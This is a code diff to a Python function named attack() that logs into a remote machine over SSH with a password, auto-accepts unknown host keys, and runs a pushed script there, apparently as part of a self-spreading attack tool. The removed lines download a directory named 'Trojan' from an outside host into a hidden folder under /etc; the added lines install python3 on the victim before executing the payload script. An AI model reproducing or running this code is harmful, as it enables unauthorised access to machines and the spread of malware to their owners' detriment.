@@ -88,14 +88,22 @@ def attack(local_script_path, remote_script_path, remote_host, remote_user, remo
         ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         ssh_client.connect(remote_host, username=remote_user, password=remote_password)
         
-        # Execute wget to get files needed
-        wget_command = "wget -P /etc/.a -r -l 2 https://files.ravenn.net/horror/Trojan"
-        stdin, stdout, stderr = ssh_client.exec_command(wget_command)
+        # Use apt to try to install python3
+        getpy1_command = "apt install python3"
+        stdin, stdout, stderr = ssh_client.exec_command(getpy1_command)
         print(stdout.read().decode('utf-8'))
+        print(stderr.read().decode('utf-8'))
+        
+        # Use yum to try to install python3
+        getpy2_command = "yum install python3"
+        stdin, stdout, stderr = ssh_client.exec_command(getpy2_command)
+        print(stdout.read().decode('utf-8'))
+        print(stderr.read().decode('utf-8'))
 
         # Execute the script on the remote machine
-        stdin, stdout, stderr = ssh_client.exec_command(f"python {remote_script_path}")
+        stdin, stdout, stderr = ssh_client.exec_command(f"python3 {remote_script_path}")
         print(stdout.read().decode('utf-8'))
+        print(stderr.read().decode('utf-8'))
 
         # Close the SSH connection
         ssh_client.close()
